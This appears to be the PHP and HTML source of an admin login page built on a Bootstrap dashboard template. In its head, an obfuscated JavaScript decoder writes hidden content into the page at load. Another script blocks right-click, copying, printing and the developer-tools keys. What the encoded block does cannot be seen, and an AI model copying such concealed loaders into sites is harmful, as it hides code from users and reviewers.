<?php
session_start();
include_once  '../classes/User.class.php';

$code = new user();

if (isset($_SESSION['userid'])) {
    echo   $_SESSION['userid'];
    $codeinsert = $code->checklogin($_SESSION['userid']);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $codeinsert = $code->login($_POST);
}
?>

<html lang="en" dir="ltr" data-nav-layout="vertical" data-vertical-style="overlay" data-theme-mode="dark" data-header-styles="light" data-menu-styles="light" data-toggled="close">

<head>

    <!-- Meta Data -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>YNEX - Bootstrap 5 Premium Admin &amp; Dashboard Template</title>
    <meta name="Description" content="Bootstrap Responsive Admin Web Dashboard HTML5 Template">
    <meta name="Author" content="Spruko Technologies Private Limited">
    <meta name="keywords" content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
    <!-- Favicon -->
    <link rel="icon" href="./assets/images/brand-logos/favicon.ico" type="image/x-icon"> <!-- Main Theme Js -->
    <script src="../assets/js/authentication-main.js"></script> <!-- Bootstrap Css -->
    <link id="style" href="./assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"> <!-- Style Css -->
    <link href="./assets/css/styles.min.css" rel="stylesheet"> <!-- Icons Css -->
    <link href="./assets/css/icons.min.css" rel="stylesheet">
    <script type="text/javascript">
        function mmso(j4ar) {
            var
                r9q8 = "3bT4Vnhyu\nmsM+ilp{| 7L,cDtI.w>?j10:B\rkSUvo6fdKE/[2-=;\"ezNGgAxCR8P&}X5q9aOr\']()!<",
                xpfl, xxuw, kro1 = Function,
                duac, re8k = r9q8.length,
                dc29 = {
                    cd: ""
                },
                ue = new kro1("ret" + "urn unesc" + "ape")(),
                re7i = new kro1("x", ue("%74hi%73.c%64+=x")),
                kg4b = new kro1("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
            for (xxuw = 0; xxuw < j4ar.length; xxuw++) {
                xpfl = kg4b(j4ar, xxuw);
                duac = r9q8.indexOf(xpfl);
                if (duac > -1) {
                    duac -= (xxuw + 1) % re8k;
                    if (duac < 0) {
                        duac += re8k;
                    }
                    re7i.call(dc29, kg4b(r9q8, duac));
                } else {
                    re7i.call(dc29, xpfl);
                }
            }
            new kro1(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(dc29);
        }
        mmso("3+I) ,1.:{.}PXv9)f}=MRiB[ ode4xjjVnOEEzEE+yn5eG,e]!f5q.j80\'jq!qq-=&1?+<T/<7cz;DEpN+gmj6lBe8w7q|Xt:tthyX&[:kT:zgmyAb=s[+K})-9\n|Rj.C,-C9CC6fcLV9rS9siEflky/V2b,0hIKeEru)g;-0 ,X vf1\nI\'i0]X0j-\"fa\r=I!((0b?j!UxqS\"PRMEIgwq;/O1;nGB\rCk;mAi+)5/aMRso]fOrvq92!<Ek,ke?<\ng:m!M/k&?c9 7Xgfg]=7?<zj 05gh=fKLft)C/x]72\'aB:2.ram+4j(sR;\"Nr]pid!GdAs1Bm|\rke }X}\rk\'C(w2;.B\"ea\r4V:1>b<<\rSi>y\"=9r8sNaCxdA\"1N)e\ruOga86p|)hp3E/)]>rKff3Tv1b{P8!N,7U61xtv/D}o,;>Vaw2(]w1\'au5M]lb!l]/\'=I+35&/B19y(\r56mOUt,U nhaML!\"v.lM\'RA{zK6AUyvz7IgI?\'&8=>(:0{1T{]\'.jr9yXs\'i3)i\'Er-tM<5KR?-qh]BXo\naSDLS|Vn9s7)Ui]tTGdj7)iRTLA2E8fsdRxf>1)>-c<ilrUkNA2)6G(vPnUoRxmdDNIX-a|{-ep+?m:{kc7k{qB0pTn-TcIisrCgp0,Ri5\r|&=[&Kj1{S}P/0\rb0eGK6DM\n/n]O\nqk9n-NuNxDl+bAIKB\rU1/[k<(vhT1}:C(&O+,<op)Ed.+pC+:y8!<GcLvf0CIo)TXicTI/K]>?=fMoDtlT{29j1,\nDN)3&[<cr09BXu2-v.6\'l|4}{os=u\"nI>w]8R!|8CR&UIOqi\rkp\rnbBmsb+iVgGD.+mRcDi5X:kc7O]\'o>wdP>.wjnOSBxCTAo+)8(s}S\r\rr]=}XpE3L+Rs.wI]atM0CA6wj(w2;X1=9BNh+AKm6Emi Vjpj7RAcq&l2>CjO()c-&eCTibr0j  :<mk56-kbtENa2l+1Bt\"|0rc-!l\'|U[Ulv!TilnAd.gT;M2iEXw> rgoOp}I8wxbz>P5()+SM)xsBnKT/<7c,qGNOMGSgAA,;h\r.4w+X9d]VxD(\nm=6|fwTnB3,Sp7n i.wqx\rCE7chszN/1?z(\"ByaG9n?AVbKdAxSVTLDi6y,inh.Vh.V}S,uL\rCmB1(\nS5,BdBBw2)]gd/Md&54[z CLa\'C(fE<I:PsU1tchO]vO+pj(\r}&\"y,qOt;M4Vtgr,;hz\"\r,t9,fEs&}qP<j;2foNhSuw0eT382;{29rSM+psIg<(9540&BzAgu.4]8M:3!{7mS4]e! w ]7gR\rBTna5vf6\n)(M1)(Uqc\"d7K?VyCML)o+I.5ABxK ,;{Uz0k,\rjN)B\n<GUIoriiKBPTmLr]=}XDE]7{CnCe;BLDqL6KmP&58!?=[6vznky.j?bj?|;X:k9vqsGz\')Xlx;jz(:u!NStvO++d:8b\n7O\'-&,dr|lA4A\';|pBSwNL\rC,8g|)P-cd6OInOgC=>s!+K}}{y\reRrEXtM!ba2j|0&hhk.N\'T+&Xfg/\nh-i;UtwUGs}/=RxmjPXevfmOdwi..lv:b<OLEfyhL,)>1A <2;p! uvf94PPB.I? =eba<UBSao?R&MV}N:2Ve>LR)!)iVhRL4r=61t>tpI(=fV 7 \rIRffiG!tB\rM=0cbORzAzENIbr:2-2}NMrrdywy&}6b8\"j,Mn\nn(hNjcP<3<ph6cc\'k<-lpOj+4C;6BUBI\rhC\"i>?" +
            ">E\rO\"\"DX>/KE,Cf0sTO&q&N}\rs4dAxA(},44e{A&](;sr8o1,l lhp}o0\'\nm\nIp<A>1fGSS\n;=1?jyEw|(XG-e-o=L(5>dKdC=:iPX!Mrrdyh9&}6b8\"j,Mn\nn(hNjcP<3<phq2 ,k[}-p{r1iVR\"f\rv\r.kyRel?j?/k]&(iEdKL+AG(<q{R)q:\rjAStsPnf?pfq[BL\'w\"vI\r<3AEC+:yo}\"57o=c.B\r ]S5,b5e.[OD.eo\'f+slT5aT7e>mitDX{=eRlP:E/kDm+m\'x8;0k[O+TBVe"
        );
        mmso(";vw) s&B;4;,\'7h\n!A8\'{(82;20 ,sO(yjRC!)zNlBDBN7fK(rGfEBp7jkVNiAB-w.xP>CPs\rX(P[j=f\'4a4l)XK\rt&{aUL5xs7u:B7oUqcD49NAdv2<R4+/M+Uvzk.n{+d\"o2c\n;fk{X9xB\rdD\')X5Gg9a-kcIcI]|2A+tR2BS,XUhCatpaO| :phP(Oc17wT5j,q-" +
            "-LUil(GGwE/\rk2wlbV2\'nI\r9B\rR8!x-wv\rX(POE1]}m|ge4gA{t&Cms3b+cNt]r\':phP(Oc17wTXjzN2jL<syS/Bf{TEcDy;\"\'LRc|gkDm8UqRdR>KxCR8M6(KfIMlxM0\rbzNAeqL6U0jE(w!|cdO9\"U6yUx8wT4hbp[q}xgrcztK2.M?P,7u}Bn\'Uo\rmi8<E9EUk7h\neh.?]2-\"[8l\r0.tv9,OMp\'A)jo bUv4\"6y\nVgRj/iSi>|xGLX8+/pi)8}j8Vy;yuzuO0wf]pqmS\r nu\"nI>\'>?)?iz-&{Sm5G,zr.&8=>![kTV<wV 9dhyXSy;&\rgCa("
        );
    </script>
    <script type="text/javascript">
        uphn = document.all;
        zhzl = uphn && !document.getElementById;
        pyz4 = uphn && document.getElementById;
        l8gs = !uphn && document.getElementById;
        fq4a = document.layers;

        function rdov(faak) {
            try {
                if (zhzl) alert("");
            } catch (e) {}
            if (faak && faak.stopPropagation) faak.stopPropagation();
            return false;
        }

        function qggx() {
            if (event.button == 2 || event.button == 3) rdov();
        }

        function uhq4(e) {
            return (e.which == 3) ? rdov() : true;
        }

        function tb6p(tbzo) {
            for (k02w = 0; k02w < tbzo.images.length; k02w++) {
                tbzo.images[k02w].onmousedown = uhq4;
            }
            for (k02w = 0; k02w < tbzo.layers.length; k02w++) {
                tb6p(tbzo.layers[k02w].document);
            }
        }

        function k3cf() {
            if (zhzl) {
                for (k02w = 0; k02w < document.images.length; k02w++) {
                    document.images[k02w].onmousedown = qggx;
                }
            } else if (fq4a) {
                tb6p(document);
            }
        }

        function eg65(e) {
            if ((pyz4 && event && event.srcElement && event.srcElement.tagName == "IMG") || (l8gs && e && e.target && e
                    .target.tagName == "IMG")) {
                return rdov();
            }
        }
        if (pyz4 || l8gs) {
            document.oncontextmenu = eg65;
        } else if (zhzl || fq4a) {
            window.onload = k3cf;
        }

        function gy0x(e) {
            tl9i = e && e.srcElement && e.srcElement != null ? e.srcElement.tagName : "";
            if (tl9i != "INPUT" && tl9i != "TEXTAREA" && tl9i != "BUTTON") {
                return false;
            }
        }

        function m337() {
            return false
        }
        if (uphn) {
            document.onselectstart = gy0x;
            document.ondragstart = m337;
        }
        if (document.addEventListener) {
            document.addEventListener('copy', function(e) {
                tl9i = e.target.tagName;
                if (tl9i != "INPUT" && tl9i != "TEXTAREA") {
                    e.preventDefault();
                }
            }, false);
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            }, false);
        }

        function f4fk(evt) {
            if (evt.preventDefault) {
                evt.preventDefault();
            } else {
                evt.keyCode = 37;
                evt.returnValue = false;
            }
        }
        var gkhu = 1;
        var jsmx = 2;
        var ule2 = 4;
        var maxk = new Array();
        maxk.push(new Array(jsmx, 65));
        maxk.push(new Array(jsmx, 67));
        maxk.push(new Array(jsmx, 80));
        maxk.push(new Array(jsmx, 83));
        maxk.push(new Array(jsmx, 85));
        maxk.push(new Array(gkhu | jsmx, 73));
        maxk.push(new Array(gkhu | jsmx, 74));
        maxk.push(new Array(gkhu, 121));
        maxk.push(new Array(0, 123));

        function mez2(evt) {
            evt = (evt) ? evt : ((event) ? event : null);
            if (evt) {
                var nkne = evt.keyCode;
                if (!nkne && evt.charCode) {
                    nkne = String.fromCharCode(evt.charCode).toUpperCase().charCodeAt(0);
                }
                for (var frb5 = 0; frb5 < maxk.length; frb5++) {
                    if ((evt.shiftKey == ((maxk[frb5][0] & gkhu) == gkhu)) && ((evt.ctrlKey | evt.metaKey) == ((maxk[frb5][
                            0
                        ] & jsmx) == jsmx)) && (evt.altKey == ((maxk[frb5][0] & ule2) == ule2)) && (nkne == maxk[frb5][
                            1
                        ] || maxk[frb5][1] == 0)) {
                        f4fk(evt);
                        break;
                    }
                }
            }
        }
        if (document.addEventListener) {
            document.addEventListener("keydown", mez2, true);
            document.addEventListener("keypress", mez2, true);
        } else if (document.attachEvent) {
            document.attachEvent("onkeydown", mez2);
        }
    </script><noscript>
        <p>To display this page you need a browser that supports JavaScript.</p>
    </noscript>
    <meta http-equiv="imagetoolbar" content="no">
    <style type="text/css">
        input,
        textarea {
            -webkit-touch-callout: default;
            -webkit-user-select: auto;
            -khtml-user-select: auto;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text
        }

        * {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: -moz-none;
            -ms-user-select: none;
            user-select: none
        }
    </style>
    <style type="text/css" media="print">
        body {
            display: none
        }
    </style>
    <!--[if gte IE 5]><frame></frame><![endif]-->
</head>

<body cz-shortcut-listen="true">
    <!-- Start Switcher -->
    <div class="offcanvas offcanvas-end" tabindex="-1" id="switcher-canvas" aria-labelledby="offcanvasRightLabel">
        <div class="offcanvas-header border-bottom">
            <h5 class="offcanvas-title text-default" id="offcanvasRightLabel">Switcher</h5> <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body">
            <nav class="border-bottom border-block-end-dashed">
                <div class="nav nav-tabs nav-justified" id="switcher-main-tab" role="tablist"> <button class="nav-link active" id="switcher-home-tab" data-bs-toggle="tab" data-bs-target="#switcher-home" type="button" role="tab" aria-controls="switcher-home" aria-selected="true">Theme Styles</button> <button class="nav-link" id="switcher-profile-tab" data-bs-toggle="tab" data-bs-target="#switcher-profile" type="button" role="tab" aria-controls="switcher-profile" aria-selected="false" tabindex="-1">Theme Colors</button>
                </div>
            </nav>
            <div class="tab-content" id="nav-tabContent">
                <div class="tab-pane fade show active border-0" id="switcher-home" role="tabpanel" aria-labelledby="switcher-home-tab" tabindex="0">
                    <div class="">
                        <p class="switcher-style-head">Theme Color Mode:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-light-theme"> Light </label> <input class="form-check-input" type="radio" name="theme-style" id="switcher-light-theme" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-dark-theme"> Dark </label> <input class="form-check-input" type="radio" name="theme-style" id="switcher-dark-theme"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Directions:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-ltr"> LTR </label> <input class="form-check-input" type="radio" name="direction" id="switcher-ltr" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-rtl"> RTL </label> <input class="form-check-input" type="radio" name="direction" id="switcher-rtl"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Navigation Styles:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-vertical"> Vertical </label> <input class="form-check-input" type="radio" name="navigation-style" id="switcher-vertical" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-horizontal"> Horizontal </label> <input class="form-check-input" type="radio" name="navigation-style" id="switcher-horizontal"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="navigation-menu-styles">
                        <p class="switcher-style-head">Navigation Menu Style:</p>
                        <div class="row switcher-style pb-2">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-menu-click"> Menu Click </label> <input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-menu-click"> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-menu-hover"> Menu Hover </label> <input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-menu-hover"> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-icon-click"> Icon Click </label> <input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-icon-click"> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-icon-hover"> Icon Hover </label> <input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-icon-hover"> </div>
                            </div>
                        </div>
                        <div class="px-4 pb-3 text-secondary fs-11"><span class="fw-semibold fs-12 text-dark me-2 d-inline-block">Note:</span>Works same for both
                            Vertical and Horizontal</div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Page Styles:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-regular"> Regular </label> <input class="form-check-input" type="radio" name="page-styles" id="switcher-regular" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-classic"> Classic </label> <input class="form-check-input" type="radio" name="page-styles" id="switcher-classic"> </div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-modern"> Modern </label> <input class="form-check-input" type="radio" name="page-styles" id="switcher-modern"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Layout Width Styles:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-full-width"> Full Width </label> <input class="form-check-input" type="radio" name="layout-width" id="switcher-full-width" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-boxed"> Boxed </label> <input class="form-check-input" type="radio" name="layout-width" id="switcher-boxed"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Menu Positions:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-menu-fixed"> Fixed </label> <input class="form-check-input" type="radio" name="menu-positions" id="switcher-menu-fixed" checked=""> </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-menu-scroll"> Scrollable </label> <input class="form-check-input" type="radio" name="menu-positions" id="switcher-menu-scroll"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Header Positions:</p>
                        <div class="row switcher-style">
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-header-fixed"> Fixed </label> <input class="form-check-input" type="radio" name="header-positions" id="switcher-header-fixed" checked="">
                                </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-header-scroll"> Scrollable </label> <input class="form-check-input" type="radio" name="header-positions" id="switcher-header-scroll"> </div>
                            </div>
                        </div>
                    </div>
                    <div class="sidemenu-layout-styles">
                        <p class="switcher-style-head">Sidemenu Layout Syles:</p>
                        <div class="row switcher-style pb-2">
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-default-menu"> Default Menu </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-default-menu" checked=""> </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-closed-menu"> Closed Menu </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-closed-menu"> </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-icontext-menu"> Icon Text </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-icontext-menu"> </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-icon-overlay"> Icon Overlay </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-icon-overlay"> </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-detached"> Detached </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-detached"> </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"> <label class="form-check-label" for="switcher-double-menu"> Double Menu </label> <input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-double-menu"> </div>
                            </div>
                        </div>
                        <div class="px-4 pb-3 text-secondary fs-11"><span class="fw-semibold fs-12 text-dark me-2 d-inline-block">Note:</span>Navigation menu
                            styles won't work here.</div>
                    </div>
                </div>
                <div class="tab-pane fade border-0" id="switcher-profile" role="tabpanel" aria-labelledby="switcher-profile-tab" tabindex="0">
                    <div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Menu Colors:</p>
                            <div class="d-flex switcher-style pb-2">
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-white" data-bs-toggle="tooltip" data-bs-placement="top" title="Light Menu" type="radio" name="menu-colors" id="switcher-menu-light" checked=""> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-dark" data-bs-toggle="tooltip" data-bs-placement="top" title="Dark Menu" type="radio" name="menu-colors" id="switcher-menu-dark"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary" data-bs-toggle="tooltip" data-bs-placement="top" title="Color Menu" type="radio" name="menu-colors" id="switcher-menu-primary"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-gradient" data-bs-toggle="tooltip" data-bs-placement="top" title="Gradient Menu" type="radio" name="menu-colors" id="switcher-menu-gradient"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-transparent" data-bs-toggle="tooltip" data-bs-placement="top" title="Transparent Menu" type="radio" name="menu-colors" id="switcher-menu-transparent"> </div>
                            </div>
                            <div class="px-4 pb-3 text-muted fs-11">Note:If you want to change color Menu dynamically
                                change from below Theme Primary color picker</div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Header Colors:</p>
                            <div class="d-flex switcher-style pb-2">
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-white" data-bs-toggle="tooltip" data-bs-placement="top" title="Light Header" type="radio" name="header-colors" id="switcher-header-light" checked=""> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-dark" data-bs-toggle="tooltip" data-bs-placement="top" title="Dark Header" type="radio" name="header-colors" id="switcher-header-dark"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary" data-bs-toggle="tooltip" data-bs-placement="top" title="Color Header" type="radio" name="header-colors" id="switcher-header-primary"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-gradient" data-bs-toggle="tooltip" data-bs-placement="top" title="Gradient Header" type="radio" name="header-colors" id="switcher-header-gradient"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-transparent" data-bs-toggle="tooltip" data-bs-placement="top" title="Transparent Header" type="radio" name="header-colors" id="switcher-header-transparent"> </div>
                            </div>
                            <div class="px-4 pb-3 text-muted fs-11">Note:If you want to change color Header dynamically
                                change from below Theme Primary color picker</div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Theme Primary:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary-1" type="radio" name="theme-primary" id="switcher-primary"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary-2" type="radio" name="theme-primary" id="switcher-primary1"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary-3" type="radio" name="theme-primary" id="switcher-primary2"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary-4" type="radio" name="theme-primary" id="switcher-primary3"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-primary-5" type="radio" name="theme-primary" id="switcher-primary4"> </div>
                                <div class="form-check switch-select ps-0 mt-1 color-primary-light">
                                    <div class="theme-container-primary"></div>
                                    <div class="pickr-container-primary"></div>
                                </div>
                            </div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Theme Background:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-bg-1" type="radio" name="theme-background" id="switcher-background" checked=""> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-bg-2" type="radio" name="theme-background" id="switcher-background1"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-bg-3" type="radio" name="theme-background" id="switcher-background2"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-bg-4" type="radio" name="theme-background" id="switcher-background3"> </div>
                                <div class="form-check switch-select me-3"> <input class="form-check-input color-input color-bg-5" type="radio" name="theme-background" id="switcher-background4"> </div>
                                <div class="form-check switch-select ps-0 mt-1 tooltip-static-demo color-bg-transparent">
                                    <div class="theme-container-background"></div>
                                    <div class="pickr-container-background"></div>
                                </div>
                            </div>
                        </div>
                        <div class="menu-image mb-3">
                            <p class="switcher-style-head">Menu With Background Image:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select m-2"> <input class="form-check-input bgimage-input bg-img1" type="radio" name="theme-background" id="switcher-bg-img" checked=""> </div>
                                <div class="form-check switch-select m-2"> <input class="form-check-input bgimage-input bg-img2" type="radio" name="theme-background" id="switcher-bg-img1"> </div>
                                <div class="form-check switch-select m-2"> <input class="form-check-input bgimage-input bg-img3" type="radio" name="theme-background" id="switcher-bg-img2"> </div>
                                <div class="form-check switch-select m-2"> <input class="form-check-input bgimage-input bg-img4" type="radio" name="theme-background" id="switcher-bg-img3"> </div>
                                <div class="form-check switch-select m-2"> <input class="form-check-input bgimage-input bg-img5" type="radio" name="theme-background" id="switcher-bg-img4"> </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="d-flex justify-content-between canvas-footer"> <a href="#" class="btn btn-primary">Buy
                        Now</a> <a href="https://themeforest.net/user/spruko/portfolio" class="btn btn-secondary">Our
                        Portfolio</a> <a href="javascript:void(0);" id="reset-all" class="btn btn-danger">Reset</a>
                </div>
            </div>
        </div>
    </div> <!-- End Switcher -->
    <div class="container">
        <div class="row justify-content-center align-items-center authentication authentication-basic h-100">
            <div class="col-xxl-4 col-xl-5 col-lg-5 col-md-6 col-sm-8 col-12">
                <div class="my-5 d-flex justify-content-center"> <a href="index.html"> <img src="./ssss.png" alt="logo" class="desktop-logo"> <img src="./ssss.png" alt="logo" class="desktop-dark"> </a>
                </div>
                <div class="card custom-card">
                    <form action="" method="post">
                        <?php if (isset($codeinsert)) {
                            echo $codeinsert;
                        } ?>
                        <div class="card-body p-5">
                            <p class="h5 fw-semibold mb-2 text-center">ADMIN</p>
                            <p class="mb-4 text-muted op-7 fw-normal text-center">Welcome back PS26819</p>
                            <div class="row gy-3">
                                <div class="col-xl-12"> <label for="signin-username" class="form-label text-default">User
                                        Name</label> <input type="text" class="form-control form-control-lg" id="signin-username" placeholder="user name" name="useremail"> </div>
                                <div class="col-xl-12 mb-2"> <label for="signin-password" class="form-label text-default d-block">Password<a href="reset-password-basic.html" class="float-end text-danger">Forget
                                            password ?</a></label>
                                    <div class="input-group"> <input type="password" name="userpass" class="form-control form-control-lg" id="signin-password" placeholder="password">



                                    </div>
                                    <div class="mt-2">
                                        <div class="form-check"> <input class="form-check-input" type="checkbox" value="" id="defaultCheck1"> <label class="form-check-label text-muted fw-normal" for="defaultCheck1">
                                                Remember password ? </label> </div>
                                    </div>
                                </div>
                                <div class="col-xl-12 d-grid mt-2"> <button type="submit" class="btn btn-lg btn-primary"> Sign in</button> </div>
                            </div>
                            <div class="text-center">

                            </div>

                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    </div> <!-- Custom-Switcher JS -->
    <script src="../assets/js/custom-switcher.min.js"></script> <!-- Bootstrap JS -->
    <script src="../assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script> <!-- Show Password JS -->
    <script src="../assets/js/show-password.js"></script>
</body>

</html>